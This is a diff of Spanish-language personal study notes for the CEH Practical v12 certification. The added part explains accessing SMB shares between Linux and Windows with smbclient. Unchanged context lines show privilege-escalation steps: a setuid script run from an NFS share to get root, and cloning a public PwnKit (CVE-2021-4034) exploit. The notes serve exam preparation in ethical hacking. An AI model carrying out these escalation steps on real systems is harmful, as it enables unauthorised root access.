@@ -1,4 +1,26 @@
 # MIS NOTAS CEH PRACTICAL V12
+## Comandos sistemas operativos
+Para acceder a un recurso compartido de una maquina Linux desde una maquina Windows, simplemente se va a Explorador de archivos > Red > \\[ip_maquina_linux]
+Por el lado contrario, para acceder a recursos compartidos de una maquina Windows desde una maquina Linux, hay varias opciones:
+
+1)	Explorador de archivos > Red > smb://[ip] NOTA: Cuando el nombre de usuario es un correo electrónico, como en mi caso, la contraseña que se introduce es la contraseña del correo, no la de la maquina.
+
+2)	Por smbclient, con los siguientes comandos:
+```
+smbclient //[ip]/nombre_del_recurso_compartido_o_carpeta -U [usuario]
+```
+Al introducir ese comando, te pedirá la contraseña para ese usuario, y se abre una línea de comandos smb> en la que puedes consultar el comando help para ver la lista de comandos disponibles, entre los cuales esta por supuesto “ls”, “cd”, “get” y “put”
+
+**NOTA:** Para poder tener acceso es necesario indicar el nombre del recurso compartido, con solo la IP no ingresara, al menos colocar “Users” o algo por el estilo.
+
+En el caso de que los directorios o archivos tengan separación, se debe colocar entre comillas ej: “Hacking ético y ciberseguridad”
+
+get [nombre del archivo.extension]
+put [nombre del archivo local.extension] [nombre deseado para guardarlo en la maquina remota.extension]
+
+Los archivos que se descarguen y se suban, se harán en el directorio en el que se encuentre la parrot ejecutando el smbclient y el directorio de windows donde este abierto el smbclient.
+
+
 
 ## Scanning and Enumeration (Siempre *sudo su* antes de ejecutarlo)
 
@@ -358,7 +380,7 @@ MAQUINA VICTIMA:
 cd [carpeta montada]
 ./nfs (SE EJECUTA EL SCRIPT, Y WE AREEE ROOT!!!)
 ```
-Vulnerabilidad PoC Pkexec
+Vulnerabilidad **PoC Pkexec**
 ```
 mkdir /tmp/pwnkit
 git clone https://github.com/berdav/CVE-2021-4034.git
